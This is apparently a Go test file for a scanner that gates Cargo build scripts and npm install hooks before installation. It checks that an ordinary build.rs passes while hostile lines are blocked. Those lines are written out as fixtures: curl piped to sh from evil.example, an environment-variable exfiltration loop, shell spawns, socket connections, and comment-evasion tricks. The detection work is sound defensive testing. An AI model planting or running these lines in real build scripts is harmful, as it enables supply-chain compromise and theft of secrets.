package installhooks

import (
	"strings"
	"testing"
)

// assessBuildRS runs the default gate over a crate whose build script is src.
func assessBuildRS(t *testing.T, cfg Config, src string) (*Report, Decision) {
	t.Helper()
	svc := newService(t, cfg)
	report, err := svc.Assess(Artifact{Ecosystem: "cargo", Name: "demo", Version: "1.0.0"},
		opener(cargoCrate(map[string]string{
			"Cargo.toml": "[package]\nname = \"demo\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n",
			"build.rs":   src,
		})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	return report, svc.Gate(report, "")
}

// An ordinary build script, written the way serde, proc-macro2, rustix and
// thiserror write theirs: links to issues and release notes in comments, a URL
// in an error message, a rustc probe started with .spawn(), environment reads.
// The gate blocked all of these before it read build scripts as Rust.
const ordinaryBuildRS = `//! Feature detection for the demo crate.
//! See <https://doc.rust-lang.org/cargo/reference/build-scripts.html>.
// Licensed under <LICENSE-APACHE or https://www.apache.org/licenses/LICENSE-2.0>.

use std::env;
use std::process::{Command, Stdio};

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    // https://blog.rust-lang.org/2024/05/02/Rust-1.78.0.html#diagnostic-attributes
    let rustc = env::var_os("RUSTC").unwrap();
    let target = env::var("TARGET").unwrap(); // see https://github.com/rust-lang/cargo/issues/11138
    /* Probing compiles a snippet: https://github.com/dtolnay/proc-macro2/issues/147
       /* nested: http://example.com */ */
    let mut child = Command::new(&rustc)
        .arg("--target")
        .arg(&target)
        .stdin(Stdio::piped())
        .spawn()
        .unwrap();
    let ok = child.wait().unwrap().success();
    if !ok {
        eprintln!("unexpected rustc output; please file an issue at https://github.com/demo/demo");
    }
    let url = env::var("DEMO_DOCS").unwrap_or_else(|_| "https://docs.rs/demo".into());
    println!("cargo:rustc-env=DEMO_DOCS={}", url);
}
`

func TestAssess_CargoOrdinaryBuildScriptPasses(t *testing.T) {
	report, dec := assessBuildRS(t, DefaultConfig(), ordinaryBuildRS)
	if dec.Action != ActionAllow {
		t.Fatalf("decision = %+v, want allow; findings %+v", dec, report.Findings)
	}
	if len(report.Hooks) != 1 || report.Hooks[0].Script != ordinaryBuildRS {
		t.Fatalf("the hook must keep the unmodified script: %+v", report.Hooks)
	}
	for _, f := range report.Findings {
		if f.RuleID != RuleNativeExtension {
			t.Errorf("unexpected finding %+v", f)
		}
	}
	if !hasRule(report.Findings, RuleNativeExtension) {
		t.Errorf("the build-script signal (cargo:rerun-if) is gone: %+v", report.Findings)
	}
}

// TestAssess_CargoBuildScriptThreats: what build scripts do when they do harm
// is still found, on the line it is on, also when a comment or a literal on the
// same line tries to make the rest of the line look like a comment.
func TestAssess_CargoBuildScriptThreats(t *testing.T) {
	cases := []struct {
		name, line, rule string
	}{
		{"download tool", `Command::new("curl").arg("-sSfL").arg(url).status().unwrap();`, RuleNetworkEgress},
		{"download tool by path", `Command::new("/usr/bin/wget").arg(url).status().unwrap();`, RuleNetworkEgress},
		{"http crate", `let body = ureq::get(url).call().unwrap();`, RuleNetworkEgress},
		{"reqwest", `let r = reqwest::blocking::get(url).unwrap();`, RuleNetworkEgress},
		{"socket", `let s = std::net::TcpStream::connect("203.0.113.7:443").unwrap();`, RuleNetworkEgress},
		{"socket import", `use std::net::UdpSocket;`, RuleNetworkEgress},
		{"async socket", `let s = tokio::net::TcpStream::connect(addr);`, RuleNetworkEgress},
		{"powershell download", `let c = "Invoke-WebRequest -Uri $u -OutFile x.exe";`, RuleNetworkEgress},
		{"shell", `Command::new("sh").arg("-c").arg(cmd).status().unwrap();`, RuleShellSpawn},
		{"shell by path", `Command::new("/bin/bash").arg(script).status().unwrap();`, RuleShellSpawn},
		{"windows shell", `Command::new(r"C:\Windows\System32\cmd.exe").args(["/C", cmd]).status().unwrap();`, RuleShellSpawn},
		{"powershell", `Command::new("powershell.exe").arg(cmd).status().unwrap();`, RuleShellSpawn},
		{"libc system", `unsafe { libc::system(cmd.as_ptr()) };`, RuleShellSpawn},
		{"sh -c in a string", `let args = ["sh -c", payload];`, RuleShellSpawn},
		{"curl piped into a shell", `let s = "curl -s https://evil.example/x | sh";`, RuleDownloadExecute},
		{"environment sent off", `for (k, v) in env::vars() { ureq::post(SINK).send_string(&v).ok(); }`, RuleEnvExfil},
		// A comment opener inside a literal does not hide the rest of the line.
		{"slashes in a string", `let x = "//"; Command::new("curl").arg(u).status().unwrap();`, RuleNetworkEgress},
		{"slashes in a raw string", `let x = r#"// "#; Command::new("sh").status().unwrap();`, RuleShellSpawn},
		{"quote in a char literal", `let q = '"'; Command::new("wget").status().unwrap(); let r = '"';`, RuleNetworkEgress},
		{"code after a block comment", `/* https://example.com */ Command::new("curl").status().unwrap();`, RuleNetworkEgress},
		{"block opener in a string", `let x = "/*"; Command::new("sh").status().unwrap(); let y = "*/";`, RuleShellSpawn},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			src := "use std::process::Command;\n// prelude https://example.com\nfn main() {\n    " + tc.line + "\n}\n"
			report, dec := assessBuildRS(t, DefaultConfig(), src)
			var found *Finding
			for i := range report.Findings {
				if report.Findings[i].RuleID == tc.rule {
					found = &report.Findings[i]
				}
			}
			if found == nil {
				t.Fatalf("no %s finding for %q: %+v", tc.rule, tc.line, report.Findings)
			}
			if found.Line != 4 {
				t.Errorf("%s reported on line %d, want 4", tc.rule, found.Line)
			}
			if dec.Action != ActionBlock {
				t.Errorf("decision = %+v, want block", dec)
			}
		})
	}
}

// TestAssess_CargoCommentsOnlyInRust: a URL in a comment is no finding,
// but the same URL outside one keeps meaning what it means to the generic
// rules in other ecosystems.
func TestAssess_CargoCommentsOnlyInRust(t *testing.T) {
	svc := newService(t, DefaultConfig())
	report, err := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "node -e \"spawn('x')\" // https://example.com"})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !hasRule(report.Findings, RuleShellSpawn) || !hasRule(report.Findings, RuleNetworkEgress) {
		t.Fatalf("npm hooks keep the generic rules: %+v", report.Findings)
	}
}

func TestAssess_CargoBuildFalse(t *testing.T) {
	svc := newService(t, DefaultConfig())
	for name, files := range map[string]map[string]string{
		// What `cargo publish` writes for a crate without a build script.
		"no build script": {"Cargo.toml": "[package]\nname = \"demo\"\nbuild = false\n", "src/lib.rs": "pub fn f() {}\n"},
		// Cargo does not run a build.rs the manifest turns off.
		"build script turned off": {"Cargo.toml": "[package]\nname = \"demo\"\nbuild = false\n", "build.rs": "fn main() { std::process::Command::new(\"sh\"); }\n"},
		// build = true is the default discovery, and there is nothing to discover.
		"discovery without a file": {"Cargo.toml": "[package]\nname = \"demo\"\nbuild = true\n"},
	} {
		report, err := svc.Assess(Artifact{Ecosystem: "cargo", Name: "demo", Version: "1.0.0"}, opener(cargoCrate(files)))
		if err != nil {
			t.Fatalf("%s: Assess: %v", name, err)
		}
		if len(report.Hooks) != 0 || len(report.Findings) != 0 || !report.Inspected {
			t.Errorf("%s: hooks %+v findings %+v inspected %v, want none and inspected", name, report.Hooks, report.Findings, report.Inspected)
		}
	}

	// A build script declared at a path the shallow scan does not read is still
	// reported by its declaration.
	report, err := svc.Assess(Artifact{Ecosystem: "cargo", Name: "demo", Version: "1.0.0"},
		opener(cargoCrate(map[string]string{"Cargo.toml": "[package]\nname = \"demo\"\nbuild = \"tools/gen.rs\"\n"})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if len(report.Hooks) != 1 || report.Hooks[0].Script != "build = tools/gen.rs" || hookLanguage(report.Hooks[0]) != "" {
		t.Fatalf("declared build script: %+v", report.Hooks)
	}
}

// TestRuleOverrideAppliesToEveryLanguage: an operator who re-tunes a rule's
// pattern gets that pattern for build scripts too.
func TestRuleOverrideAppliesToEveryLanguage(t *testing.T) {
	src := "fn main() {\n    eprintln!(\"see https://example.com\");\n}\n"
	if report, _ := assessBuildRS(t, DefaultConfig(), src); hasRule(report.Findings, RuleNetworkEgress) {
		t.Fatalf("a URL in a message is no egress by default: %+v", report.Findings)
	}
	cfg := DefaultConfig()
	cfg.Rules = []RuleSpec{{ID: RuleNetworkEgress, Pattern: `(?i)https?://`}}
	report, dec := assessBuildRS(t, cfg, src)
	if !hasRule(report.Findings, RuleNetworkEgress) || dec.Action != ActionBlock {
		t.Fatalf("the operator's pattern must apply to build scripts: %+v %+v", report.Findings, dec)
	}
	// An override may bring its own pattern for Rust.
	cfg.Rules = []RuleSpec{{ID: RuleNetworkEgress, Pattern: `(?i)https?://`, LangPatterns: map[string]string{langRust: `never-matches-\d`}}}
	if report, _ := assessBuildRS(t, cfg, src); hasRule(report.Findings, RuleNetworkEgress) {
		t.Fatalf("the override's Rust pattern must win: %+v", report.Findings)
	}
}

func TestCompileRuleLanguagePatterns(t *testing.T) {
	if _, err := compileSpec(RuleSpec{ID: "x", Pattern: "a", LangPatterns: map[string]string{langRust: "("}}); err == nil ||
		!strings.Contains(err.Error(), "rust") {
		t.Fatalf("a bad language pattern must fail with the language named: %v", err)
	}
	rule, err := compileSpec(RuleSpec{ID: "x", Pattern: "generic", LangPatterns: map[string]string{langRust: "rusty"}})
	if err != nil {
		t.Fatal(err)
	}
	if len(rule.match("generic", langRust)) != 0 || len(rule.match("rusty", langRust)) != 1 {
		t.Fatal("a language pattern must replace the generic one for that language")
	}
	if len(rule.match("generic", "")) != 1 || len(rule.match("rusty", "")) != 0 {
		t.Fatal("other hooks keep the generic pattern")
	}
	plain, err := compileSpec(RuleSpec{ID: "y", Pattern: "generic"})
	if err != nil {
		t.Fatal(err)
	}
	if plain.lang != nil || len(plain.match("generic", langRust)) != 1 {
		t.Fatal("a rule without language patterns uses its pattern everywhere")
	}
	for _, spec := range builtinRuleSpecs {
		for lang := range spec.LangPatterns {
			if lang != langRust {
				t.Errorf("rule %s: pattern for unknown language %q", spec.ID, lang)
			}
		}
	}
}
